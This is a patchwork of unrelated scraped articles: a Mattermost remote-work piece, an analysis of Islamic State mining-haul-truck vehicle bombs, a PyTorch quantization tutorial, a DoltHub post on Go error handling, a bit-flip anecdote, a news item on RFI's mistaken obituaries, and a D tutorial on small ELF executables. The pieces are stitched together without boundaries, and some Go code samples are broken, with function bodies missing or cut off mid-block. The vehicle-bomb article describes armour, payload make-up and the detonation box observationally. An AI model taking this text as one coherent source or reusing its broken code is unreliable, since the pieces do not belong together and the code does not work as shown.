puzzle. When you’re a remote company, onboarding is a lot more focused on reading through information.</p><p>Don’t get me wrong — new hires at Mattermost still talk to a lot of people in their first few weeks —&nbsp;but the interactions they have are more meaningful because they’ve gotten all the administrative stuff out of the way. New hires can get up to speed on the history and context of ongoing projects and initiatives when they join and can start asking much higher quality, deep questions during those first interactions.</p><h2><strong>To find great remote employees, prioritize candidates with strong writing skills</strong></h2><p>One thing that’s become even more clear during the pandemic: there are people who really like working remote and thrive in a remote work environment, but it’s not for everyone. Right now everyone needs to work remotely. While many people have realized working from home is amazing — they love not having to commute, they love the independence, the flexibility — there are others who really miss the office environment.</p><p>One of the biggest indicators that we’ve found around who thrives in a remote environment is strong written communication skills. If you’re a strong writer and you can consume information in written formats really well, you’ll probably have an easier time transitioning to a remote team than someone who prefers face-to-face communication.</p><h2><strong>Want to join Mattermost’s remote-first team?</strong></h2><p>Mattermost is on a mission to connect the world with what matters most, and we’re continually looking for people to help us achieve that goal —&nbsp;no matter where in the world they live.&nbsp;To learn more about what it’s like to work at Mattermost and to see our current open roles, check out our <a href="https://mattermost.com/careers/">Careers page</a>.</p></div></article></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article aria-label="Mining Haul Trucks – The Largest SVBIEDs In The World"><div><p><span>The SVBIEDs used by the Islamic State (IS) throughout the years have come in all different sizes. Everything from sedans, to pick-up trucks, heavy transport trucks, heavy construction equipment, and military armoured vehicles have been converted into rolling bombs. While large shell vehicles have been relatively common, there’s one rare category of vehicles completely unmatched both in its absurd size and obscurity <span>— t</span>he mining haul trucks. There has only been 3 recorded cases of IS using this vehicle type in SVBIED attacks, ever.&nbsp;In this article I will be detailing all available information about these attacks, beginning with the first example in August, 2015.</span></p>
<p><span><strong>No. 1 — Homs province, Syria (August, 2015)</strong></span></p>
<p><span>In late May 2015, IS managed to <a href="https://www.telegraph.co.uk/news/worldnews/middleeast/syria/11633289/Isil-seizes-Syrian-regimes-lucrative-phosphate-mines.html">seize the strategic town of Khunayfis</a>, located approximately 60 kilometres to the Southwest of Palmyra in the central Syrian desert of Homs province. Along with the town, IS militants also seized the Khunayfis phosphate mine. The mine is one of two in the area, with the other one located at al-Sharqiyah/as-Sawwanah. In a photo released by IS from the Sawwanah facility which was also captured around the same time,&nbsp;at least 6 <a href="https://belsat.eu/en/news/isis-militants-have-worlds-biggest-armored-cars-made-belarusian-belaz-dump-trucks/">Belarusian-made Belaz&nbsp;haul trucks</a> could be seen lined up. These massive vehicles are traditionally employed in large mining operations, but IS would find a much more destructive use for them.</span></p>
<p><span><img loading="lazy" src="https://hugokaaman.com/wp-content/uploads/2019/03/Khunayfis-phosphate-mine-near-palmyra_lateMay2015.jpg" alt="" width="980" height="619" srcset="https://hugokaaman.com/wp-content/uploads/2019/03/Khunayfis-phosphate-mine-near-palmyra_lateMay2015.jpg 980w, https://hugokaaman.com/wp-content/uploads/2019/03/Khunayfis-phosphate-mine-near-palmyra_lateMay2015-300x189.jpg 300w, https://hugokaaman.com/wp-content/uploads/2019/03/Khunayfis-phosphate-mine-near-palmyra_lateMay2015-768x485.jpg 768w" sizes="(max-width: 980px) 100vw, 980px">In the spirit of experimentation and not letting anything go to waste, IS decided to move one of these Belaz haul trucks to one of their workshops near the town of al-Qaryatayn, where it would be overhauled to function as an SVBIED. It’s unclear whether the chosen haul truck was taken from Khunayfis or al-Sharqiyah/as-Sawwanah. A photo taken during the manufacturing process showed that the massive vehicle had been plastered with a primary layer of improvised frontal armour in the form of metal sheets, and a secondary layer of improvised slat armour on top. At the time of the photo, the driver’s cabin had not yet been up-armoured.</span></p>
<p><span><img loading="lazy" src="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.25.04.jpg" alt="" width="444" height="734" srcset="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.25.04.jpg 444w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.25.04-181x300.jpg 181w" sizes="(max-width: 444px) 100vw, 444px">On August 19th 2015, the finished haul truck SVBIED was featured in an official IS photo report. With the addition of improvised metal sheets, armoured glass, as well as slat armour to the driver’s cabin, the vehicle was ready to depart on its mission.</span></p>

<p><span><img loading="lazy" src="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.24.29.jpg" alt="" width="1023" height="575" srcset="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.24.29.jpg 1023w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.24.29-300x169.jpg 300w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.24.29-768x432.jpg 768w" sizes="(max-width: 1023px) 100vw, 1023px">According to IS themselves, the haul truck had been fitted with a hefty explosive payload weighing in at 8 tons. The chosen target for this monstrous SVBIED was the Syrian loyalist-controlled Mafraq checkpoint, located Northeast of al-Qaryatayn. Although the operation itself wasn’t shown in a video, a distant night vision photograph of the detonation was included in the photo report.</span></p>

<p><span><strong>No. 2 — Anbar province, Iraq (January, 2017)</strong></span></p>
<p><span>In late January 2017, an Iraqi fighter uploaded a remarkable <a href="https://twitter.com/HKaaman/status/825804781352529920">video</a>. The 2-minute long video, shot somewhere in Iraq’s Anbar desert, featured the second recorded example of a Belaz haul truck converted into an up-armoured SVBIED.</span></p>
<p><span><img loading="lazy" src="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.38.34.jpg" alt="" width="1273" height="710" srcset="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.38.34.jpg 1273w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.38.34-300x167.jpg 300w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.38.34-768x428.jpg 768w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.38.34-1024x571.jpg 1024w" sizes="(max-width: 1273px) 100vw, 1273px">The frontal armour mounted on this haul truck appeared a lot more reserved and inconspicuous than that of its predecessor. Instead of applying a wall of metal sheets to the front, smaller sections had been mounted to key areas. For example, a large centre piece metal sheet shielded the engine. The slats in the sheet were purposely designed to prevent the engine from overheating. A smaller piece of improvised armour was also mounted in front of the&nbsp;right-side set of frontal wheels. The driver’s cabin was the most heavily shielded, with large metal sheets and armoured glass protecting the driver. This change in armour placement is actually fairly logical. The engine, driver’s cabin, and wheels are the weakest points on the haul truck. Hence, most of the work put in to overhaul the vehicle focused on these 3 crucial areas. However, seeing as this haul truck SVBIED was captured before it could be employed in battle, it’s unclear whether more armour additions were intended. a smaller piece of improvised armour mounted in front of he left-side set of frontal wheels seem to be the only component missing though.<img loading="lazy" src="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.38.50.jpg" alt="" width="1277" height="714" srcset="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.38.50.jpg 1277w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.38.50-300x168.jpg 300w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.38.50-768x429.jpg 768w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.38.50-1024x573.jpg 1024w" sizes="(max-width: 1277px) 100vw, 1277px">The overhauled haul truck was found parked at the lower end of a ramp leading into a large desert dug-out. Looking at the vehicle from inside the underground storage facility, it appeared far more imposing.</span></p>
<p><span><img loading="lazy" src="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.40.18.jpg" alt="" width="1273" height="714" srcset="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.40.18.jpg 1273w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.40.18-300x168.jpg 300w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.40.18-768x431.jpg 768w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.40.18-1024x574.jpg 1024w" sizes="(max-width: 1273px) 100vw, 1273px">The video also included a short look at the rather large explosive payload. The payload consisted of a series of explosive-filled jugs, barrels and gas tanks wired together. Taking into account the size of the rear bed of the haul truck, there was likely more than one layer of IEDs. However, the top layer alone was quite impressive. I estimate the top layer alone consisting of at least 30 large jugs (blue), around 100 smaller jugs (white/yellow/red/green), and 3 gas tanks. Seeing as we don’t know exactly how much explosives were contained in each jug, it’s &nbsp;difficult to get a precise estimate of the weight of the payload.</span></p>

The video itself didn’t provide specifics as to where the SVBIED was seized other than it being in Anbar province. However, there are a number of large mining operations in Anbar province previously under IS control where it could have been taken from originally, including the <a href="https://en.wikipedia.org/wiki/Akashat">Akashat</a> facility.</span></p>
<p><span><strong>No. 3 — Nineveh province, Iraq (May, 2017)</strong></span></p>
<p><span>As the battle for Western Mosul entered its final stages in May 2017, the remaining IS contingent put up a fierce defence. In an official video released by IS in mid-May 2017, the third and final example of an up-armoured haul truck SVBIED was featured along with a series of other standardised SVBIEDs.&nbsp;</span></p>
<p><span><img loading="lazy" src="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.51.27.jpg" alt="" width="1262" height="706" srcset="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.51.27.jpg 1262w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.51.27-300x168.jpg 300w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.51.27-768x430.jpg 768w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.51.27-1024x573.jpg 1024w" sizes="(max-width: 1262px) 100vw, 1262px">The armour placement on this example was noticeably more refined and all-encompassing compared to the previous two examples. A series of inter-connected metal plates covered the entire front of the vehicle. Angled armour with air intakes shielded the engine, and a piece of armoured glass acted as a viewing port for the driver as per usual. Furthermore, both sides of the original rear bed had been removed in favour of an improvised metal sheet. This example was also the first to have been fitted with rear armour shielding the rear wheel sets from incoming fire.</span></p>
<p><span>Identical writings in Arabic on both the frontal armour above the driver’s viewing port and on the rear bed side armour could be roughly translated into “B150”&nbsp;<span><strong>—</strong>&nbsp;a unique identifying serial number.</span></span></p>

The video that this example was featured in actually featured very short snippets of the interior, offering a clue as to how it was set up. In the first section, an IS fighter could be seen climbing up into the vehicle.<img loading="lazy" src="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.49.17.jpg" alt="" width="1257" height="706" srcset="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.49.17.jpg 1257w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.49.17-300x168.jpg 300w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.49.17-768x431.jpg 768w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.49.17-1024x575.jpg 1024w" sizes="(max-width: 1257px) 100vw, 1257px">A look at the driver’s seat showed the armoured glass from the inside, and also provided a glimpse of the white box detonation mechanism mounted next to the steering wheel on the right,<img loading="lazy" src="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.49.54.jpg" alt="" width="1260" height="710" srcset="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.49.54.jpg 1260w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.49.54-300x169.jpg 300w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.49.54-768x433.jpg 768w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.49.54-1024x577.jpg 1024w" sizes="(max-width: 1260px) 100vw, 1260px">The gunner of this 2-man SVBIED was positioned in the next room, protected by improvised metal armour on all sides. According to <a href="https://twitter.com/calibreobscura?lang=en">Calibre Obscura</a>, an expert on identifying small arms, the primary armament was a Chinese-made 12.7mm <a href="https://en.wikipedia.org/wiki/W85_heavy_machine_gun">W85</a> heavy machine gun fixed on what looked like an improvised pintle mount. The secondary armaments included both a Soviet <a href="https://en.wikipedia.org/wiki/PK_machine_gun">PK</a> machine gun, as well as what appeared to be a Bulgarian AK-type rifle.<img loading="lazy" src="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-25-at-13.37.07.jpg" alt="" width="1271" height="714" srcset="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-25-at-13.37.07.jpg 1271w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-25-at-13.37.07-300x169.jpg 300w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-25-at-13.37.07-768x431.jpg 768w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-25-at-13.37.07-1024x575.jpg 1024w" sizes="(max-width: 1271px) 100vw, 1271px">Now, where did IS source this vehicle from? It definitely wasn’t transported all the way from Anbar province. Conveniently enough, the previously IS-controlled Badush cement plant, located approximately 20 kilometres Northwest of W. Mosul operated multiple Belaz haul trucks. When the Iraqi army recaptured the cement plant in June 2017, what remained of the facility and its vehicles was documented in a <a href="https://www.youtube.com/watch?v=7WytqV_x7c4">video</a> by al-Mawsliya TV. The “B” in the identifying serial number of this example (“B150”) may also have been a reference to its origin, the Badush plant.<img loading="lazy" src="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-24-at-20.18.45.jpg" alt="" width="1139" height="594" srcset="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-24-at-20.18.45.jpg 1139w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-24-at-20.18.45-300x156.jpg 300w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-24-at-20.18.45-768x401.jpg 768w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-24-at-20.18.45-1024x534.jpg 1024w" sizes="(max-width: 1139px) 100vw, 1139px"></span></p>
<p><span><strong>Efficient use, or Propaganda?</strong></span></p>
<p><span>The real question here is whether using gigantic haul trucks as SVBIED shells serves a purpose other than an aesthetic one. Because, let’s face it&nbsp;– The ones that have been recorded really do look impressive. Looking beyond that, the efficiency of using this type of SVBIED is very questionable.</span></p>
<p><span>Firstly, it doesn’t really make sense to use such a massive shell vehicle as a vessel to carry explosives. When you have a smaller shell vehicle, such as a pick-up truck or even a heavy truck, the vehicle itself acts as more shrapnel and debris upon detonation. However, the bigger and heavier the shell vehicle is, the more explosives is required in order to render it a viable option. For example, mining haul trucks weigh in at around 45 tons, an absurd weight. When you use it as an SVBIED, the frame of the vehicle will absorb a lot of the explosive energy of the payload upon detonation. And while IS claimed that the first haul truck SVBIED had an explosive payload of 8 tons, it’s not really that much when you account for the weight of the haul truck itself and the explosives required to tear it apart.</span></p>
<p><span>The comparatively smaller category of heavy trucks can still carry payloads of the same weight class, and they don’t carry with them the problem of the frame of the vehicle itself being too large. In this aspect, there’s no logic at all to using haul trucks.</span></p>
<p><span>The large size and weight of the haul trucks presents another issue as well. Their slow speed, combined with their large profile, means that they’ll be large targets advancing toward their targets slowly. This means that the opposing force will have a lot more time to fire on a much larger target than …</span></p></div></article></div>

      <h3 id="introduction">Introduction</h3>

<p>Dynamic quantization quantize the weights of neural networks to integers, but the activations are dynamically quantized during inference. Comparing to floating point neural networks, the size of dynamic quantized model is much smaller since the weights are stored as low-bitwidth integers. Comparing to other quantization techniques, dynamic quantization does not require any data for calibration or fine-tuning. More details about the mathematical foundations of quantization for neural networks could be found in my article <a href="https://leimao.github.io/article/Neural-Networks-Quantization/">“Quantization for Neural Networks”</a>.</p>



<p>Given a pre-trained floating point model, we could easily create an dynamically quantized model, run inference, and potentially achieve better latency without too much additional effort. In this blog post, I would like to show how to use PyTorch to do dynamic quantizations.</p>

<h3 id="pytorch-dynamic-quantization">PyTorch Dynamic Quantization</h3>

<p>Unlike TensorFlow 2.3.0 which supports integer quantization using arbitrary bitwidth from 2 to 16, PyTorch 1.7.0 only supports 8-bit integer quantization. The workflow is as easy as loading a pre-trained floating point model and apply a dynamic quantization wrapper.</p>



<p>In this case, I would like to use the BERT-QA model from HuggingFace Transformers as an example. I was dynamically quantizing the <code>torch.nn.Linear</code> layer for the BERT-QA model since the majority of the computation for Transformer based models are matrix multiplications.</p>

Text: 
According to PolitiFact the top 400 richest Americans "have more wealth than half of all Americans combined." According to the New York Times on July 22, 2014, the "richest 1 percent in the United States now own more wealth than the bottom 90 percent". Inherited wealth may help explain why many Americans who have become rich may have had a "substantial head start". In September 2012, according to the Institute for Policy Studies, "over 60 percent" of the Forbes richest 400 Americans "grew up in substantial privilege".
Question: 
What publication printed that the wealthiest 1% have more money than those in the bottom 90%?

New York Times
Dynamic Quantized Model Answer: 
New York Times

<p>We could see that the model size of the INT8 quantized model is much smaller than the FP32 model. The inference latency of INT8 dynamic quantization on CPU is much faster than the FP32 ordinary inference on CPU. However, FP32 inference using NVIDIA GPU is still the fastest.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text"><p>When <a href="https://www.dolthub.com/team#tim">Tim</a>, <a href="https://www.dolthub.com/team#aaron">Aaron</a>, and <a href="https://www.dolthub.com/team#brian">I</a>
started working on this problem in August 2018 we immediately began playing with <a href="https://github.com/attic-labs/noms">Noms</a>.
It was an open source project that gave us a lot of the things Aaron and I had been talking about in order to deliver the
features we felt were critical to our success.  Noms gave us the ability to efficiently diff across commits, and
merge commits.  Though Noms had become an inactive project, we felt it would tremendously improve our go to market
time to use it as our storage layer, so we decided it was worth diving deeper.</p>
<p>I built a demo of a command line tool that used the Git commands people already know in order to
version structured table data.  As we played with the demo, we felt like we were on to something, and
decided to really go after the "Git for Data" product that is <a href="https://doltdb.com/">Dolt</a> today. After additional
investment in delivering a fully featured Git-like command line we began to think about <a href="https://dolthub.com/">DoltHub</a>,
a place for our users to find, collaborate on, and store data projects. This was the first time we needed to access
data stored using Noms on backend servers, and it was at this time we discovered issues with how Noms handled errors.</p>

<p>I'm not going to go into detail on the language design decisions behind Go's panics and errors.  If you would like that
background before going further I'd take a look at <a href="https://eli.thegreenplace.net/2018/on-the-uses-and-misuses-of-panics-in-go/">this article</a>
which covers it in depth.  However, a nasty problem with panics is that a panic without a deferred recover on any go routine
will crash your program.  If you are writing a server handling many concurrent requests, any panic that escapes on any
go routine will cause every single one of the concurrently executing requests to fail.  All those connections will be
closed, and the server will restart. In a sufficiently complicated server where go routines handling requests
spawn additional go routines and use <a href="https://levelup.gitconnected.com/communicating-sequential-processes-csp-for-go-developer-in-a-nutshell-866795eb879d">CSP</a>
to do work, using panics for flow control is a recipe for disaster. With so much invested in using Noms, we decided to
"hard fork" the project and eliminate the heavy use of panics.</p>

<p>The process of eliminating panics started out pretty straight forward.  Search the codebase for a panic, change the
signature of the method to return an error, and replace the panic.  Then find all the call sites where the method
and handle the error, or return it up the callstack.  I thought I'd be able to migrate from panics to errors
in about a week.  Boy was I wrong.</p>

<p>As soon as I realized that Noms could panic when calculating the hash of its types I knew I was way off. In the
end I think I spent closer to 6 weeks on this.  It was time-consuming, and boring, but it couldn't be automated and every
one of the changes was an opportunity to introduce bugs.  Today, searching the updated Noms codebase for <code>if err != nil</code>
returns 1370 results, and I'm guessing more than half of those were introduced while removing panics. It effected hundreds
of function signatures.  Because Noms lies below our main application's code, the changes bubble up to all the code which
depends on Noms directly and indirectly. </p>

<p>GO advocates for using CSP in order to write concurrent code.  New go routines are spawned in order to do parallel processing
and channels are used to communicate between go routines.  It was in these cases where panics were causing the biggest problems,
and they were the more interesting cases to talk about when converting panics to errors, as converting these improperly
can introduce deadlocks.</p>
<p>Lets start by defining a simple function we want to run concurrently:</p>
<div data-language="go"><pre><code><span>func</span> <span>process</span><span>(</span>ctx context<span>.</span>Context<span>,</span> workCh <span>chan</span> WorkItem<span>,</span> resCh <span>chan</span> WorkItemResult<span>)</span> <span>error</span> <span>{</span>
    <span>for</span> workItem <span>:=</span> <span>range</span> workCh <span>{</span>
        res<span>,</span> err <span>:=</span> <span>doWork</span><span>(</span>workItem<span>)</span>

        <span>if</span> err <span>!=</span> <span>nil</span> <span>{</span>
            <span>return</span> err
        <span>}</span>       

        resCh <span>&lt;-</span> res
    <span>}</span>

    <span>return</span> <span>nil</span>
<span>}</span></code></pre></div>
<p>The function takes a channel that it reads work items from, and a channel that it writes results to.  In the event that
an error is encountered the function returns the error. A straightforward, but erroneous way to handle this would be:</p>
<div data-language="go"><pre><code><span>func</span> <span>myConcurrentFunc</span><span>(</span>ctx context<span>.</span>Context<span>,</span> workItems WorkItem<span>)</span> <span>(</span><span>[</span><span>]</span>WorkItemResult<span>,</span> <span>error</span><span>)</span> <span>{</span>

    <span>}</span>
    
    <span>return</span> workItemResults<span>,</span> <span>nil</span>
<span>}</span></code></pre></div>
<p>The first problem here, is that the <code>err</code> instance is modified and read in an unsafe manner.  This can be resolved using
a mutex or Go's atomic primitives, and this is a simplified version of how I handled these errors in many cases. I created
a class <code>AtomicError</code> that made these types of operations thread safe, but this example still has other issues. </p>
<p>If <code>process()</code> errors on one of the go routines, all the other ones will continue running until they all error, or
all the work items have been completed despite not having any impact (No matter what happens we are going to <code>return nil, err</code>).
Depending on the use, maybe this behavior is acceptable, but in cases where the operation takes a long time, this does not
work.  This can be fixed by testing the state of the atomic error in the <code>process</code> loop but it can make the code pretty ugly. </p>
<p>Another suboptimal characteristic of this code is that you need to create the channels with buffers
large enough to hold every work item, and result.  It is possible to avoid this also, but it involves additional synchronization
in order to close the result channel just a single time when an error is encountered, or when all work is done and the last
go processing routine exits.  </p>
<p>Finally, when we are talking about this being run on a server as a part of a request, there is the very real possibility
that the request may get cancelled for some reason, such as exceeding some pre-defined deadline.  In order to handle this
and the other errors in a cleaner way I wish I had known about <a href="https://godoc.org/golang.org/x/sync/errgroup">errgroup</a>.</p>

<p>errgroup is an extremely simple package with just <a href="https://github.com/golang/sync/blob/master/errgroup/errgroup.go">a single small file</a>.
It uses the <code>context.Context</code> that is used throughout Golang to implement <code>errgroup.Group</code> which will update the context
if any one of them returns an error. Our updated code looks like this:</p>
<div data-language="go"><pre><code><span>func</span> <span>process</span><span>(</span>ctx context<span>.</span>Context<span>,</span> workCh <span>chan</span> WorkItem<span>,</span> resCh <span>chan</span> WorkItemResult<span>)</span> <span>error</span> <span>{</span>
    <span>for</span> <span>{</span>
        <span>select</span> <span>{</span>
        <span>case</span> workItem<span>,</span> ok <span>:=</span>  <span>&lt;-</span> workCh<span>:</span>
            <span>if</span> <span>!</span>ok <span>{</span>
                <span>break</span>
            <span>}</span>   
        <span>case</span> <span>&lt;-</span>ctx<span>.</span><span>Done</span><span>(</span><span>)</span>
            <span>break</span>
        <span>}</span>  

        res<span>,</span> err <span>:=</span> <span>doWork</span><span>(</span>workItem<span>)</span>

        <span>if</span> err <span>!=</span> <span>nil</span> <span>{</span>

<p>This code handles all the issues enumerated above, and it also allows the results to be handled concurrently with the
processing.  In the cases where you are doing something expensive with each result this could provide a performance
improvement.</p>

<p>There seems to be only one reason to use panics for flow control. Littering your code with explicit error checking after
every function call is tedious and ugly.  You are right, but the beauty of your code, won't improve your product. Go
forces explicit error handling that results in programs that do the appropriate things when error conditions are encountered.
It may be ugly, but I hope my pain and suffering serve as yet another reason not to use panics instead of returning errors.</p></div></div>]]>

<p><span>Published on 2019-09-01 by <a href="https://alexbakker.me/">Alexander Bakker</a></span></p><article><p>I think I experienced a random bit flip while updating Linux on one of my
machines today. My laptop was humming along happily during compilation until GCC
suddenly aborted with an error: <strong><em>invalid preprocessing directive #lefine; did
you mean #define?</em></strong>.</p>

<p><img src="https://alexbakker.me/img/random-bit-flip.png" alt=""></p>

<p>Huh, <code>#lefine</code> instead of <code>#define</code>?</p>

<p>Now, GCC is known for its cryptic error messages, but this one left me baffled.
Things I tried to figure out what the issue could be:</p>

<ul>
<li>I first grepped the offending file, <code>drivers/gpu/drm/i915/i915_reg.h</code>, for
<code>#lefine</code> to see if a typo somehow slipped through the Linux 4.19.1 release,
but got 0 matches.</li>
<li>When I resumed the build, it completed without errors. The kernel also
appeared to run fine upon reboot. I ended up recompiling it entirely multiple
times to see if I could reproduce the error, but I couldn’t.</li>
<li>I ran a MemTest86 test for 24 hours, but it didn’t find any errors, so the RAM
is also unlikely to be the culprit.</li>
</ul>

<p>I thought I was losing my mind until it dawned on me that this could have been
caused by cosmic rays. Looking at ASCII table, we see that ’d’ and ‘l’ are
indeed one bit flip away from each other:</p>

<table>
<thead>
<tr>
<th>char</th>
<th>decimal</th>
<th>binary</th>
</tr>
</thead>

<tbody>
<tr>
<td>d</td>
<td>100</td>
<td>1100100</td>
</tr>

<tr>
<td>l</td>
<td>108</td>
<td>1101100</td>
</tr>
</tbody>
</table>
<p>Could that be it? Isn’t that incredibly unlikely? There doesn’t appear to be a
consensus in existing literature <sup id="fnref:1"><a href="#fn:1">1</a></sup> <sup id="fnref:2"><a href="#fn:2">2</a></sup> <sup id="fnref:3"><a href="#fn:3">3</a></sup> on how often these errors
actually occur, but I did learn that this phenomenon is actually more common
than I thought. The chances of flipping a bit that would cause software to break
in this fashion, on the other hand, must be incredibly small.</p>

<p>In the end, there’s just no way to prove that this was actually caused by cosmic
rays. It could also have been some other extremely rare hardware fluke. Either
way, this took me by surprise, to say the least.</p>

<p>Perhaps this is the cosmos’ way of telling me to invest in ECC RAM.</p>

<p>France's RFI public radio has apologised for mistakenly publishing obituaries for a number of celebrities still very much alive, including Britain's Queen Elizabeth and Brazilian football legend Pele.</p>
<p>Citing a "technical problem" that caused the death notices to be released on its website today, the broadcaster said: "We offer our apologies to the people concerned and to you who follow and trust us.</p>
<p>"We are mobilising to rectify this major bug," said the Twitter account of RFI, which saw itself the target of much online derision for the error.</p>
<p>Others RFI declared dead included Iran's supreme leader Ayatollah Ali Khamenei, former US President Jimmy Carter, Cuban leader Raul Castro, actors Clint Eastwood, Sophia Loren and Brigitte Bardot.</p>
<p>French business mogul Bernard Tapie, 77, whose obituary had been prematurely published by other news outlets at least twice before, was also on the RFI list.</p><blockquote>
<p>🔴 Un problème technique a entraîné la publication de nombreuses nécrologies sur notre site.<br>
Nous sommes mobilisés pour rectifier ce bug majeur et présentons nos excuses aux personnes concernées ainsi qu'à vous qui nous suivez et nous faites confiance.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-776">

    

	<div>

		
<p>In the spirit of “<a rel="noreferrer noopener" href="https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html" target="_blank">A Whirlwind Tutorial on Creating Really Teensy ELF Executables for Linux</a>,”  we are going to try to create a minimal 64 bit ELF executable using just standard D and some inline assembly code.</p>



<p>We are going to focus on creating the standard hello world executable popularized by Brian Kernighan. </p>



<p>In the standard D language, using the phobos library (the now only real standard library for D, previously there existed two competing standard libraries), we would write this as:</p>


<pre title="">import std.stdio;

int main(){
    write("Hello\n");
    return 0;
}
</pre>


<p>Compiling this:</p>



<pre><code>dmd basic_hello.d </code></pre>



<p>yields a 1.9M executable.</p>



<pre><code>wc -c ./basic_hello
 1895528 ./basic_hello</code></pre>



<p>Using gdc brings it down to 28k. Note: gdc like gcc defaults to naming the executable ‘a.out’, whereas dmd names it after the file or module.</p>



<pre><code>gdc basic_hello.d 
wc -c ./a.out
 28608 ./a.out</code></pre>



<p>So we get some improvement.  The biggest issue is that it is dynamically linking in a bunch of code we don’t need, including a bunch of machinery for exceptions we won’t throw, and code to handle cases we don’t need.  Really we just need to put a string to standard out, which is exactly what the C function puts is for.</p>


<pre title="">import core.stdc.stdio;

int main(){
    puts("Hello");
    return 0;
}
</pre>


<p>Compiling this with gdc give us a small decrease in size.</p>



<pre><code>gdc basic_hello.d 
wc -c ./a.out
 21296 ./a.out</code></pre>



<p>Running ldd on it we can see we still pull in the D runtime even though we don’t need it.</p>



<p>&gt; ldd ./a.out<br>linux-vdso.so.1 (0x00007ffd02db8000)<br>libgphobos.so.1 =&gt; /lib64/libgphobos.so.1 (0x00007f4b1caa8000)<br>libgcc_s.so.1 =&gt; /lib64/libgcc_s.so.1 (0x00007f4b1ca8d000)<br>libm.so.6 =&gt; /lib64/libm.so.6 (0x00007f4b1c947000)<br>libpthread.so.0 =&gt; /lib64/libpthread.so.0 (0x00007f4b1c925000)<br>libdl.so.2 =&gt; /lib64/libdl.so.2 (0x00007f4b1c91e000)<br>libc.so.6 =&gt; /lib64/libc.so.6 (0x00007f4b1c753000)<br>/lib64/ld-linux-x86-64.so.2 (0x00007f4b1d09f000)</p>



<p>This is exactly what betterC mode is for! Let’s try it. We just need to modify our main function to be ‘extern(C)’.</p>


<pre title="">import core.stdc.stdio;
extern(C):
int main(){
    puts("Hello");
    return 0;
}
</pre>


<p>With gdc, betterC mode is called with the flag ‘no-druntime’.</p>



<pre><code>gdc -fno-druntime basic_hello.d 
wc -c ./a.out
 20600 ./a.out</code></pre>



<p>So that is pretty good and we are down to just 20k. And we are only linking against the standard C library.</p>



<p>&gt;ldd ./a.out<br>linux-vdso.so.1 (0x00007ffd119c7000)<br>libgcc_s.so.1 =&gt; /lib64/libgcc_s.so.1 (0x00007f447f734000)<br>libc.so.6 =&gt; /lib64/libc.so.6 (0x00007f447f569000)<br>/lib64/ld-linux-x86-64.so.2 (0x00007f447f783000)</p>



<p>We can run strip on it to save some space:</p>



<pre><code>strip -s ./a.out
wc -c ./a.out
 15016 ./a.out</code></pre>



